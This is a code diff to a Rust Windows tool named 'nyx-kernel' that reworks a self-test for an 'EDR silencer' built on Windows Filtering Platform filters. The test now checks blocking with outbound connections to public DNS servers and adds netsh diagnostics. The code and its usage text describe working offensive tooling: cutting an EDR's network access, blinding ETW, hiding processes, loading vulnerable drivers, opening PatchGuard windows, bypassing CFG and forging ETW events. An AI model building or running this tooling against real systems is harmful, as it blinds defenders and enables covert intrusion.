@@ -22,7 +22,7 @@
 //!   nyx-kernel detach-minifilter
 //!   nyx-kernel window-open [pid] / window-close   # T2 operator time-window
 //!   nyx-kernel pg-window   # enter a PatchGuard unchecked window (holds until Ctrl+C)
-//!   nyx-kernel wfp-selftest  # driverless WFP kit e2e (admin; baseline→block→restore)
+//!   nyx-kernel wfp-selftest  # driverless WFP kit e2e (admin; outbound 443, not loopback)
 //!   nyx-kernel --serve <port>   # daemon mode — REQUIRES NYX_DAEMON_TOKEN (see below)
 //!   nyx-kernel --help           # full usage incl. daemon wire protocol
 //!
@@ -79,8 +79,8 @@ fn main() {
 
     // ---- 1c. WFP kit self-test (driverless: needs admin + BFE, no driver) ----
     // End-to-end proof of netsec::UserModeEdrSilencer on a live box. See
-    // op_wfp_selftest. Hidden child modes: --wfp-probe-connect (one loopback
-    // TCP connect attempt, exit 0/1) and --wfp-probe-idle (AppId anchor).
+    // op_wfp_selftest. Hidden child modes: --wfp-probe-connect (one outbound
+    // TCP/443 connect attempt, exit 0/1) and --wfp-probe-idle (AppId anchor).
     if cmd == "wfp-selftest" {
         std::process::exit(op_wfp_selftest());
     }
@@ -747,9 +747,9 @@ fn op_blind_etw(tier: &nyx_operator_kernelsdk::KernelTier) -> Result<(), String>
 
 // ---- wfp-selftest -----------------------------------------------------------
 
-/// Hidden child mode: one TCP connect to `addr` (e.g. "127.0.0.1:49152"),
-/// exit 0 on success / 1 on failure. Keeps the stream open briefly so the
-/// parent's accept() drains the completed handshake from the backlog.
+/// Hidden child mode: one TCP connect to `addr` (e.g. "1.1.1.1:443"),
+/// exit 0 on success / 1 on failure. Holds the stream briefly so ALE classify
+/// and netevents can observe the flow before the child exits.
 #[cfg(target_os = "windows")]
 fn wfp_probe_connect(addr: &str) -> i32 {
     use std::net::{SocketAddr, TcpStream};
@@ -757,7 +757,7 @@ fn wfp_probe_connect(addr: &str) -> i32 {
         Ok(sa) => sa,
         Err(_) => return 1,
     };
-    match TcpStream::connect_timeout(&sa, std::time::Duration::from_secs(5)) {
+    match TcpStream::connect_timeout(&sa, std::time::Duration::from_secs(8)) {
         Ok(_s) => {
             std::thread::sleep(std::time::Duration::from_millis(400));
             0
@@ -766,29 +766,115 @@ fn wfp_probe_connect(addr: &str) -> i32 {
     }
 }
 
+/// Spawn the sacrificial probe copy for one connect; `None` if spawn/wait fails.
+#[cfg(target_os = "windows")]
+fn wfp_run_probe(probe: &std::path::Path, addr: &str) -> Option<i32> {
+    let mut child = std::process::Command::new(probe)
+        .arg("--wfp-probe-connect")
+        .arg(addr)
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .spawn()
+        .ok()?;
+    child.wait().ok()?.code()
+}
+
+/// Best-effort `netsh wfp show <what> file=-`. Never fails the caller.
+#[cfg(target_os = "windows")]
+fn wfp_netsh_show(what: &str, needles: &[&str]) {
+    let out = match std::process::Command::new("netsh")
+        .args(["wfp", "show", what, "file=-"])
+        .output()
+    {
+        Ok(o) => o,
+        Err(e) => {
+            eprintln!("[!] netsh wfp show {what} file=-: {e}");
+            return;
+        }
+    };
+    if !out.status.success() {
+        let err = String::from_utf8_lossy(&out.stderr);
+        eprintln!(
+            "[!] netsh wfp show {what} file=- exited {} {}",
+            out.status,
+            err.trim()
+        );
+    }
+    let text = String::from_utf8_lossy(&out.stdout);
+    if text.is_empty() {
+        eprintln!("[!] netsh wfp show {what}: empty stdout");
+        return;
+    }
+    let lines: Vec<&str> = text.lines().collect();
+    let mut shown = 0usize;
+    for (i, l) in lines.iter().enumerate() {
+        if !needles.iter().any(|n| !n.is_empty() && l.contains(n)) {
+            continue;
+        }
+        let lo = i.saturating_sub(12);
+        let hi = (i + 3).min(lines.len());
+        for seg in &lines[lo..hi] {
+            eprintln!("    {seg}");
+        }
+        eprintln!("    ----");
+        shown += 1;
+        if shown >= 8 {
+            eprintln!("    ... truncated {what} dump");
+            break;
+        }
+    }
+    if shown == 0 {
+        eprintln!("[!] netsh wfp show {what}: no lines matched {needles:?}");
+        let n = lines.len().min(40);
+        for seg in &lines[..n] {
+            eprintln!("    {seg}");
+        }
+    }
+    if what == "filters" {
+        if !text.contains("nyx_wfp_probe") {
+            eprintln!(
+                "[!] no live filter references the probe image — install matched nothing?"
+            );
+        }
+        if !text.contains("NyxWfpKit") {
+            eprintln!("[!] no live filter named NyxWfpKit");
+        }
+    }
+}
+
 /// `wfp-selftest` — driverless end-to-end proof of the WFP kit
-/// (`netsec::UserModeEdrSilencer`) on a live Windows box:
+/// (`netsec::UserModeEdrSilencer`) on a live Windows box.
 ///
-///   1. baseline:  a sacrificial probe copy of THIS exe connects loopback → OK
+/// Product path is outbound IPv4: `ALE_AUTH_CONNECT_V4` + AppId BLOCK.
+/// Loopback is NOT a valid proxy for that layer. Hosted Server 2025
+/// (nyx-ci-test run 33135027007) installed the filter (`path_match=true`,
+/// sublayer `0xFFFF`) but `blocked=false` because the CONNECT+AppId filter
+/// does not match loopback classify. Loopback is flagged `IS_LOOPBACK` even
+/// when connecting to the machine's own LAN IP; the system PERMIT lives at
+/// `ALE_AUTH_RECV_ACCEPT` with `IsNonAppContainerLoopback`. OpenVPN treats
+/// loopback as a separate rule family. Raising sublayer weight cannot help.
+///
+///   1. baseline:  a sacrificial probe copy of THIS exe connects outbound
+///                 TCP/443 (1.1.1.1, then 8.8.8.8, then 9.9.9.9) → OK
 ///   2. install:   `silence_edr([idle_probe_pid])` → ALE_APP_ID block filter
 ///                 bound to the probe image path; assert filter_count == 1
-///   3. blocked:   a new probe process connects → MUST FAIL (else the filter
-///                 matches nothing and the kit is a false capability)
+///   3. blocked:   a new probe process connects the same dest → MUST FAIL
+///                 (else the filter matches nothing and the kit is a false
+///                 capability)
 ///   4. residue:   drop the guard (BFE session close auto-removes session
 ///                 filters) → a new probe connects → MUST SUCCEED (else the
 ///                 session-scoped cleanup contract is broken — the
 ///                 "filters outlive us" residue bug class)
 ///
-/// All traffic is 127.0.0.1 loopback (ALE_AUTH_CONNECT_V4 covers loopback
-/// connects) — no internet dependency, no third-party process involved, and
-/// the AppId anchor is our own temp copy, never a real EDR image.
-///
+/// The AppId anchor is our own temp copy, never a real EDR image.
 /// Requires admin (FwpmEngineOpen0 → BFE). No driver / no bootstrap needed.
+/// Hosted runners are expected to have egress; no dest reachable is
+/// `env_limit:no outbound` (exit 6), not a product fail.
 ///
 /// Exit codes: 0 pass · 2 baseline broken (harness fault, NOT the kit) ·
 /// 3 filter did not block · 4 residue after drop · 5 operational error ·
-/// 6 env skip (no admin / BFE down — `note` starts with `env_limit:`, not a
-/// product failure).
+/// 6 env skip (no admin / BFE down / no outbound — `note` starts with
+/// `env_limit:`, not a product failure).
 /// Prints ONE machine-readable line: {"wfp_selftest":{...}} on stdout.
 #[cfg(target_os = "windows")]
 fn op_wfp_selftest() -> i32 {
@@ -797,7 +883,6 @@ fn op_wfp_selftest() -> i32 {
     };
     use nyx_operator_kernelsdk::WfpKit;
     use std::io::Write;
-    use std::net::TcpListener;
     use std::process::{Command, Stdio};
 
     let json_escape = |s: &str| s.replace('\\', "\\\\").replace('"', "\\\"");
@@ -847,63 +932,46 @@ fn op_wfp_selftest() -> i32 {
         let _ = std::fs::remove_file(probe);
     };
 
-    let listener = match TcpListener::bind("127.0.0.1:0") {
-        Ok(l) => l,
-        Err(e) => {
-            eprintln!("[!] bind loopback: {e}");
-            cleanup(&probe);
-            json(false, false, false, 0, "listener bind failed", 0, 0, false);
-            return 5;
-        }
-    };
-    let port = listener.local_addr().map(|a| a.port()).unwrap_or(0);
-    listener.set_nonblocking(true).ok();
-    let addr = format!("127.0.0.1:{port}");
-
-    // Spawn a probe child and accept its connection; returns Some(exit_code).
-    let run_probe = |listener: &TcpListener, probe: &std::path::Path, addr: &str| -> Option<i32> {
-        let mut child = Command::new(probe)
-            .arg("--wfp-probe-connect")
-            .arg(addr)
-            .stdout(Stdio::null())
-            .stderr(Stdio::null())
-            .spawn()
-            .ok()?;
-        // Accept with a 10s deadline (nonblocking poll).
-        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
-        loop {
-            match listener.accept() {
-                Ok((_s, _peer)) => break,
-                Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
-                    if std::time::Instant::now() > deadline {
-                        break;
-                    }
-                    std::thread::sleep(std::time::Duration::from_millis(25));
-                }
-                Err(_) => break,
+    // 1. Baseline: unfiltered probe must reach a real outbound dest (the
+    // product path is ALE_AUTH_CONNECT_V4, which does not classify loopback).
+    const WFP_PROBE_DESTS: [&str; 3] = ["1.1.1.1:443", "8.8.8.8:443", "9.9.9.9:443"];
+    let mut dest: Option<&str> = None;
+    let mut probe_ran = false;
+    for d in WFP_PROBE_DESTS {
+        match wfp_run_probe(&probe, d) {
+            Some(0) => {
+                dest = Some(d);
+                break;
             }
+            Some(_) => {
+                probe_ran = true;
+                eprintln!("[!] wfp-selftest baseline dest {d} failed, trying next");
+            }
+            None => eprintln!("[!] wfp-selftest spawn probe {d} failed"),
         }
-        child.wait().ok()?.code()
-    };
-
-    // 1. Baseline: unfiltered probe must connect (else the harness is broken).
-    let baseline = run_probe(&listener, &probe, &addr) == Some(0);
-    if !baseline {
-        eprintln!("[!] wfp-selftest baseline connect failed — harness fault, not the kit");
-        cleanup(&probe);
-        json(
-            false,
-            false,
-            false,
-            0,
-            "baseline connect failed",
-            0,
-            0,
-            false,
-        );
-        return 2;
     }
-    eprintln!("[+] wfp-selftest baseline: loopback connect OK");
+    let Some(addr) = dest else {
+        cleanup(&probe);
+        if !probe_ran {
+            eprintln!("[!] wfp-selftest baseline connect failed — harness fault, not the kit");
+            json(
+                false,
+                false,
+                false,
+                0,
+                "baseline connect failed",
+                0,
+                0,
+                false,
+            );
+            return 2;
+        }
+        let note = "env_limit:no outbound";
+        eprintln!("[!] wfp-selftest env_limit skip: {note}");
+        json(false, false, false, 0, note, 0, 0, false);
+        return 6;
+    };
+    eprintln!("[+] wfp-selftest baseline: outbound connect OK ({addr})");
 
     // 2. Idle probe anchors the AppId (pid → image path at install time).
     let mut idle = match Command::new(&probe)
@@ -991,46 +1059,30 @@ fn op_wfp_selftest() -> i32 {
     }
 
     // 3. Blocked phase: the probe image must now fail to connect.
-    let blocked = run_probe(&listener, &probe, &addr) != Some(0);
+    let blocked = wfp_run_probe(&probe, addr) != Some(0);
     eprintln!("[+] wfp-selftest blocked phase: connect blocked = {blocked}");
     if !blocked {
-        // Live diagnostics (2026-08-24: first hosted-runner run, Server 2025
-        // x64, blocked=false while the identical kit passes on Win11 26100
-        // ARM64). The guard owns a DYNAMIC session — its filters vanish the
-        // moment this process exits, so a workflow post-mortem would see an
-        // empty table. Dump the live filter list NOW plus AppId path equality
-        // (idle image vs connecting probe copy).
+        // Live diagnostics. The guard owns a DYNAMIC session — its filters
+        // vanish the moment this process exits, so a workflow post-mortem
+        // would see an empty table. Dump the live filter list and netevents
+        // NOW plus AppId path equality (idle image vs connecting probe copy).
         eprintln!("[!] wfp-selftest probe copy: {}", probe.display());
         eprintln!("[!] wfp-selftest idle image: {image_path}");
         eprintln!(
-            "[!] wfp-selftest path_match={path_match} session_flags={session_flags:#x} app_id_blob_len={app_id_blob_len} filters={filters}"
+            "[!] wfp-selftest dest={addr} path_match={path_match} session_flags={session_flags:#x} app_id_blob_len={app_id_blob_len} filters={filters}"
         );
-        if let Ok(out) = std::process::Command::new("netsh")
-            .args(["wfp", "show", "filters", "file=-"])
-            .output()
-        {
-            let text = String::from_utf8_lossy(&out.stdout);
-            let lines: Vec<&str> = text.lines().collect();
-            let needle = "nyx_wfp_probe";
-            for (i, l) in lines.iter().enumerate() {
-                if l.contains(needle) {
-                    let lo = i.saturating_sub(12);
-                    let hi = (i + 3).min(lines.len());
-                    for seg in &lines[lo..hi] {
-                        eprintln!("    {seg}");
-                    }
-                    eprintln!("    ----");
-                }
-            }
-            if !text.contains(needle) {
-                eprintln!(
-                    "[!] no live filter references the probe image — install matched nothing?"
-                );
-            }
-            if !text.contains("NyxWfpKit") {
-                eprintln!("[!] no live filter named NyxWfpKit");
-            }
-        }
+        wfp_netsh_show("filters", &["nyx_wfp_probe", "NyxWfpKit"]);
+        let dest_host = addr.split(':').next().unwrap_or(addr);
+        wfp_netsh_show(
+            "netevents",
+            &[
+                "nyx_wfp_probe",
+                "NyxWfpKit",
+                "CLASSIFY_DROP",
+                "FWPM_NET_EVENT_TYPE_CLASSIFY_DROP",
+                dest_host,
+            ],
+        );
         drop(guard);
         let _ = idle.kill();
         cleanup(&probe);
@@ -1051,7 +1103,7 @@ fn op_wfp_selftest() -> i32 {
     drop(guard);
     // Give BFE a beat to process the session close.
     std::thread::sleep(std::time::Duration::from_millis(500));
-    let restored = run_probe(&listener, &probe, &addr) == Some(0);
+    let restored = wfp_run_probe(&probe, addr) == Some(0);
     eprintln!("[+] wfp-selftest residue phase: connect restored = {restored}");
 
     let _ = idle.kill();
@@ -1582,7 +1634,7 @@ fn usage_text() -> &'static str {
 
 Commands:
   bootstrap [--byovd <sys> <svc>] [--wdt <sys>] [--alsysio <sys>] [--flt-rva <hex>]
-  wfp-selftest             # driverless WFP kit e2e: baseline→block→restore (admin; prints {"wfp_selftest":{...}}; exit 6 = env_limit skip)
+  wfp-selftest             # driverless WFP kit e2e: baseline→block→restore via outbound TCP/443 (not loopback; admin; prints {"wfp_selftest":{...}}; exit 6 = env_limit skip)
   assess                   # real T4-T5 kernel assessment (prints {"assess":{...}} JSON line)
   blind-etw
   hide <pid>
@@ -1593,7 +1645,7 @@ Commands:
   window-close             # best-effort reverse; kits without undo report restored:false
   window --phase open|close [pid]
   pg-window                # PatchGuard unchecked window (holds until Ctrl+C)
-  wfp-selftest             # driverless WFP kit e2e: baseline→block→restore (admin; prints {"wfp_selftest":{...}}; exit 6 = env_limit skip)
+  wfp-selftest             # driverless WFP kit e2e: baseline→block→restore via outbound TCP/443 (not loopback; admin; prints {"wfp_selftest":{...}}; exit 6 = env_limit skip)
   cfg-bypass               # mark NtContinue as a valid CFG call target
   forge-etw [<parent> <child> <image> [out.bin]]
   --serve <port>           # daemon mode (see below)
